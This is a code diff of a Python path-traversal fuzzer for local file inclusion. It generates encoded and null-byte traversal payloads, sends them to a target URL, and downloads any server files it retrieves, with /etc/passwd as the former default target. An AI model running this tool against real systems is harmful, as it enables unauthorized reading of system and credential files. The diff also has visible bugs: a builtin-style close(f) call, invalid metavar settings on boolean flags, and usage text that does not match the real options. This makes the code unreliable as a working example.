@@ -47,7 +47,7 @@ def generate_traversal(method, nb):
 
 
 def build_payload(filename, nb_parent = 10, urlencode = 0, path_prefix = "",
-                    append_null = False, traversal_method=0, var=''):
+                append_null = False, traversal_method=0, var=''):
 
     #evade_remove_backpath = False
     null = "\x00"
@@ -83,8 +83,14 @@ def check_url(base_url, payload):
     return requests.get(base_url + payload)
 
 
-def check_result(result, min_length = None, success_string = None, error_string = None):
+def check_result(result, status = None, error_status = None, min_length = None, success_string = None, error_string = None):
     check = True
+
+    if status is not None and result.status_code not in status:
+        check = False
+
+    if error_status is not None and result.status_code in error_status:
+        check = False
 
     if min_length is not None and len(result.text) <= min_length:
         check = False
@@ -107,30 +113,65 @@ def download(result, payload, folder_dest):
         f.write(result.text)
 
 
+def stress(args):
+    f = open(args.wordlist, 'r')
+
+    for filename in f:
+
+        for parent in range(6,10):
+            for encode in range(3):
+                for method in [0,1,2,999]:
+                    for prefix in ['', args.path_prefix, 'my_fake_folder/', '/var/www/html/']:
+
+                        payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=False, traversal_method=method)
+                        result = check_url(args.url, payload)
+                        if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):
+                            print(f'status {result.status_code}, length {len(result.text)}, payload {payload}')
+
+                        payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=True, traversal_method=method)
+                        result = check_url(args.url, payload)
+                        if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):
+                            print(f'status {result.status_code}, length {len(result.text)}, payload {payload}')
+    
+    #We're done stressing
+    close(f)
+
+
+def msg_usage(name=None):
+    return f'''
+Basic : 
+    {name} -c 18 -a 10 -n 1
+Specify performance settings : 
+    {name} -c 18 -a 10 -n 1 -p 10 -d 9.6 -s 128
+Repeater stuff :
+    {name} -c 18 -a 10 -n 1 -x client
+'''
+
 def main():
 
-
-    print(random_traversal(5))
-
     parser = argparse.ArgumentParser(description='LFI Fuzzer')
-    parser.add_argument('-u', '--url', required=True, help='URL to fuzz')
-    parser.add_argument('-w', '--wordlist', required=True)
+    parser.add_argument('-u', '--url', metavar='', required=True, help='URL to fuzz')
+    parser.add_argument('-w', '--wordlist', metavar='', required=True)
 
-    parser.add_argument('-p', '--nb_parent', type=int, default=10, help='Number of times going up in directory tree')
-    parser.add_argument('-e', '--urlencode', type=int, default=0, help='0 : no encoding, 1 : normal encoding, 2 : double encoding')
-    parser.add_argument('-r', '--path_prefix', default='', help='Real of a fake path to prefix to payload')
-    parser.add_argument('-n', '--append_null', action='store_true', help='Add a null char at the URL end')
-    parser.add_argument('-m', '--traversal_method', type=int, default=0, help='Traversal method')
+    group1 = parser.add_argument_group('Fuzz parameters')
+    group1.add_argument('-p', '--nb-parent', metavar='', type=int, default=10, help='Number of times going up in directory tree')
+    group1.add_argument('-c', '--urlencode', metavar='', type=int, default=0, choices=[0,1,2], help='0 : no encoding, 1 : normal encoding, 2 : double encoding')
+    group1.add_argument('-r', '--path-prefix', metavar='', default='', help='Real of a fake path to prefix to payload')
+    group1.add_argument('-n', '--append-null', metavar='', action='store_true', help='Add a null char at the URL end')
+    group1.add_argument('-m', '--traversal-method', metavar='', type=int, default=0, choices=[0,1,2,999], help='Traversal method : 0=../ 1=..// 2=....// 999=random')
+    parser.add_argument('-a', '--var', metavar='', default='', help='Replace [VAR] placeholder with this value')
 
-    parser.add_argument('-s', '--stress', action='store_true', help='Try multiple method')
-    parser.add_argument('-o', '--output', action='store_true', help='Output URLs to STDOUT instead of fetching them')
-    parser.add_argument('-d', '--download', metavar='DIRECTORY', help='Download found files in this directory')
-    parser.add_argument('-v', '--verbose', action='store_true', help='Show complete payloads')
-    parser.add_argument('-x', '--var', default='', help='Show complete payloads')
+    group2 = parser.add_argument_group('Fuzzing actions')
+    parser.add_argument('-t', '--stress', metavar='', action='store_true', help='Try every parameters with every item of wordlist')
+    parser.add_argument('-o', '--output', metavar='', action='store_true', help='Output URLs to STDOUT instead of fetching them')
+    parser.add_argument('-d', '--download', metavar='', help='Download found files in this directory')
 
-    parser.add_argument('-l', '--min_length', default='0', type=int, help='Minimum response length')
-    parser.add_argument('-ss', '--success_string', help='Success string to look for')
-    parser.add_argument('-es', '--error_string', help='Error/failure string to ignore')
+    group3 = parser.add_argument_group('Filter & success/error detection')
+    group3.add_argument('-s', '--status', metavar='', default=[200], type=int, action='append', help='Status code allowed')
+    group3.add_argument('-e', '--error-status', metavar='', default=[400,404,500], type=int, action='append', help='Status code to ignore')
+    group3.add_argument('-l', '--min-length', metavar='', default='0', type=int, help='Minimum response length')
+    group3.add_argument('-ss', '--success-string', metavar='', help='Success string to look for')
+    group3.add_argument('-es', '--error-string', metavar='', help='Error/failure string to ignore')
 
     args = parser.parse_args()
 
@@ -144,24 +185,7 @@ def main():
 
 
     if args.stress:
-        filename = '/etc/passwd'
-
-        for parent in range(6,10):
-            for encode in range(3):
-                for method in [0,1,2,999]:
-                    for prefix in ['', args.path_prefix, 'my_fake_folder/', '/var/www/html/']:
-
-                        payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=False, traversal_method=method)
-                        result = check_url(args.url, payload)
-                        if check_result(result, args.min_length, args.success_string, args.error_string):
-                            print(f'length {len(result.text)}, payload {payload}')
-
-                        payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=True, traversal_method=method)
-                        result = check_url(args.url, payload)
-                        if check_result(result, args.min_length, args.success_string, args.error_string):
-                            print(f'length {len(result.text)}, payload {payload}')
-
-        #We're done stressing
+        stress(args)
         exit()
 
 
@@ -178,13 +202,16 @@ def main():
     f = open(args.wordlist, 'r')
 
     for filename in f:
-
+        
         if filename[0] == "#":
             continue
 
         filename = filename.strip()
+
         payload = build_payload(filename, nb_parent=args.nb_parent, urlencode=args.urlencode, path_prefix=args.path_prefix, 
                                     append_null=args.append_null, traversal_method=args.traversal_method, var=args.var)
+
+        print("\r", payload, end='')
 
         if args.output:
             print(args.url, payload, sep='')
@@ -193,16 +220,14 @@ def main():
             result = check_url(args.url, payload)
 
             #Only print results successfully passing test(s). No test = output every result
-            if check_result(result, args.min_length, args.success_string, args.error_string):
+            if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):
 
-                if args.verbose:
-                    print(f'{filename} : length {len(result.text)}, payload {payload}')
-                else:
-                    print(f'{filename} : length {len(result.text)}')
+                print(f'{filename} : status {result.status_code}, length {len(result.text)}, payload {payload}')
                 
                 if args.download:
-                    download(result, filename, args.download)
+                    download(result, filename.replace('[VAR]', args.var), args.download)
 
+    close(f)
 
 if __name__ == "__main__":
     main()
